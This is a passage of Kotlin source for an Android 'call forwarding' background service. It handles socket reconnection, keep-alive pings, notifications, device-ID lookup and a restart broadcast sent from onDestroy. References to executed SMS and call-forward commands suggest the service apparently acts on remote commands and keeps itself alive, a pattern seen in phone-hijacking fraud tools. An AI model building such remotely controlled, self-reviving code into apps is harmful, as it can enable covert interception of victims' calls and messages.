        }
        
        handler.postDelayed(keepAliveRunnable, 300000)
        Log.d(TAG, "✅ Keep-alive scheduled - HTTP ping every 5 minutes + socket ping")
    }
    
    private fun scheduleReconnect() {
        Log.d(TAG, "⏰ Scheduling reconnection...")
        
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        
        val delays = longArrayOf(5000, 10000, 30000, 60000, 300000)
        val delayIndex = min(connectionAttempts % delays.size, delays.size - 1)
        val nextDelay = delays[delayIndex.toInt()]
        
        Log.d(TAG, "⏰ Reconnect in ${nextDelay/1000}s (attempt #$connectionAttempts)")
        
        reconnectRunnable = Runnable {
            try {
                Log.d(TAG, "🔄 Attempting reconnection...")
                socket?.disconnect()
                startSocketConnection()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Reconnection failed: ${e.message}")
                connectionAttempts++
                scheduleReconnect()
            }
        }
        
        handler.postDelayed(reconnectRunnable!!, nextDelay)
    }
    
    private fun updateNotification(status: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔥 Call Forwarding Service")
                .setContentText(status)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()
                
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.notify(NOTIFICATION_ID, notification)
            
            Log.d(TAG, "📱 Notification updated: $status")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating notification: ${e.message}")
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("🔥 Call Forwarding Service")
            .setContentText("🚀 Persistent service active - Real-time ready")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Forwarding Service",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Persistent call forwarding with real-time commands"
                    setShowBadge(true)
                    enableLights(true)
                    enableVibration(false)
                }
                
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager?.createNotificationChannel(channel)
                
                Log.d(TAG, "✅ Notification channel created")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error creating notification channel: ${e.message}")
            }
        }
    }

    private fun getCustomDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
            Log.d(TAG, "✅ Device ID retrieved: $id")
            id
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error getting device ID: ${e.message}")
            "unknown_device"
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

     override fun onDestroy() {
        Log.d(TAG, "💀💀💀 SERVICE DESTROYING 💀💀💀")
        
        isServiceStarted = false
        
        // ✅ Reset connection flags
        isSocketConnected = false
        isSocketConnecting = false
        
        handler.removeCallbacksAndMessages(null)
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        
        socket?.let {
            try {
                Log.d(TAG, "🧹 Cleaning up socket on destroy")
                it.off()
                it.disconnect()
                it.close()
                Log.d(TAG, "✅ Socket cleaned up successfully")
            } catch (e: Exception) {
                Log.e(TAG, "⚠️ Error cleaning socket: ${e.message}")
            }
        }
        socket = null
        
        executedSmsCommands.clear()
        executedCallForwardCommands.clear()
        Log.d(TAG, "✅ Deduplication sets cleared")
        
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
                Log.d(TAG, "✅ WakeLock released")
            }
        }
        
        Log.d(TAG, "✅ Cleanup complete - scheduling restart")
        
        try {
            val broadcastIntent = Intent().apply {
                action = RESTART_ACTION
                setClass(this@CallForwardingBackgroundService, CallForwardingRestartReceiver::class.java)
            }
            sendBroadcast(broadcastIntent)
            Log.d(TAG, "✅ Restart broadcast sent")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error sending restart broadcast: ${e.message}")
        }
        
        super.onDestroy()
    }

}
